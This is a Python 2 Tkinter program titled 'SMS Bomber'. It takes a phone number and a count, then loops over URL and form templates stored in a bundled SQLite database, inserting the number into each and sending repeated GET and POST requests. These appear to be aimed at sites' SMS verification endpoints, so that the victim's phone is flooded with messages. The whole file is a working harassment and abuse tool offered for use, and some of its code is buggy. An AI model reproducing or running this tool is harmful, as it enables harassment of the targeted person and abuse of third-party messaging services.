#encoding:utf-8
import sqlite3,sys,os
import requests
from Tkinter import *
from tkinter.scrolledtext import ScrolledText
import tkinter as tk
import tkMessageBox
import threading,time
requests.packages.urllib3.disable_warnings()


class smsstart(object):

    def __init__(self, master, info='谨慎使用！！！'):
        self.master = master
        self.mainlabel = Label(master, text=info, justify=CENTER)
        self.mainlabel.grid(row=0, columnspan=3)
        #号码
        self.user = Label(master, text='phonenumber', borderwidth=2)
        self.user.grid(row=1, sticky=W)
        #次数
        self.pwd = Label(master, text='frequency', borderwidth=2)
        self.pwd.grid(row=2, sticky=W)
        #输入号码
        self.userEntry = Entry(master)
        self.userEntry.grid(row=1, column=1, columnspan=2)
        self.userEntry.focus_set()
        #输入次数
        self.pwdEntry = Entry(master)
        self.pwdEntry.grid(row=2, column=1, columnspan=2)
        #开始按钮
        self.loginButton = Button(master, text='start', borderwidth=2, command=self.login)
        self.loginButton.grid(row=3, column=1)
        #结束按钮
        self.clearButton = Button(master, text='stop', borderwidth=2, command=self.clear)
        self.clearButton.grid(row=3, column=2)
        #输出
        # self.sendPage = Scrollbar(master)
        self.sendText = Entry(master)
        self.sendText = ScrolledText(master,height=10, width=50,wrap=tk.WORD)
        self.sendText.grid(row=4, column=0, columnspan=3)


    def login(self):
        self.username = self.userEntry.get().strip()
        self.passwd = self.pwdEntry.get().strip()
        if len(self.username) > 11:
            tkMessageBox.showwarning('警告', '手机号码格式错误')
            self.clear()
            self.userEntry.focus_set()
            return
        self.connect()

    def connect(self):
        ceshi =  self.username + '\n'
        self.sendText.insert(END, ceshi)
        self.x = Bomber(self.username,int(self.passwd))
        self.x.start()
        # self.smssend(self.username, self.passwd)

    def clear(self):
        self.userEntry.delete(0, END)
        self.pwdEntry.delete(0, END)
        self.sendText.delete(1.0,END)
        self.x.stop()

    def sendpost(self,url,dict):
        # 设置包头
        head = {'Content-Type': 'application/x-www-form-urlencoded'}
        # 设置代理
        proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
        # print text
        try:
            # r = requests.post(url, proxies=proxies,data=dict,headers=head,verify=False)
            r = requests.post(url, data=dict, headers=head, verify=False)
        except Exception, e:
            posterr =  'this is post error!!!'
            self.sendText(END, posterr)

    def sendget(self,url):
        # 设置包头
        head = {'Content-Type': 'application/x-www-form-urlencoded'}
        # 设置代理
        proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
        # print text
        try:
            # r = requests.get(url, proxies=proxies,headers=head,verify=False)
            r = requests.get(url, headers=head, verify=False)
        except Exception, e:
            geterr =  'this is get error!!!' + '\n'
            self.sendText(END, geterr)


class Bomber(threading.Thread):
    def __init__(self, phone, num):
        threading.Thread.__init__(self)
        super(Bomber, self).__init__()
        self._stop_event = threading.Event()
        self.thread_num = phone
        self.interval = num

    def resource_path(self,relative_path):
        if getattr(sys, 'frozen', False):  # 是否Bundle Resource
            base_path = sys._MEIPASS
        else:
            base_path = os.path.abspath(".")
        return os.path.join(base_path, relative_path)

    def run(self):
        filename = self.resource_path(os.path.join("res", "sql.db"))
        cx = sqlite3.connect(filename)
        cu = cx.cursor()
        cu.execute("select * from user")
        datas = cu.fetchall() * 10

        for i in range(0, self.interval + 1):
            data1 = datas[i]
            name = data1[0]
            url = data1[1].replace('[phone]', str(self.thread_num))
            text = data1[2].replace('[phone]', str(self.thread_num))
            cishu = '发送次数：' + str(i + 1) + '\n'
            smsstart.sendText.insert(END, cishu)

            if len(text) > 1:
                dict = {}
                text1 = text.replace('=', ' ').replace('&', ' ').split()
                for x in range(len(text1) - 1):
                    a = text1[x]
                    b = text1[x + 1]
                    dict[a] = b
                # print dict
                self.sendpost(url, dict)
            self.sendget(url)

    def sendpost(self, url, dict):
        # 设置包头
        head = {'Content-Type': 'application/x-www-form-urlencoded'}
        # 设置代理
        proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}

        try:
            # r = requests.post(url, proxies=proxies,data=dict,headers=head,verify=False)
            r = requests.post(url, data=dict, headers=head, verify=False)
        except Exception, e:
            posterr = 'this is post error!!!' + '\n'
            smsstart.sendText.insert(END, posterr)

    def sendget(self, url):
        # 设置包头
        head = {'Content-Type': 'application/x-www-form-urlencoded'}
        # 设置代理
        proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}

        try:
            # r = requests.get(url, proxies=proxies,headers=head,verify=False)
            r = requests.get(url, headers=head, verify=False)
        except Exception, e:
            geterr = 'this is get error!!!' + '\n'
            smsstart.sendText.insert(END, geterr)

    def stop(self):
        self._stop_event.set()

    def stopped(self):
        return self._stop_event.is_set()

if __name__ == "__main__":

    root = Tk()
    root.title('SMS Bomber')
    smsstart = smsstart(root)
    mainloop()



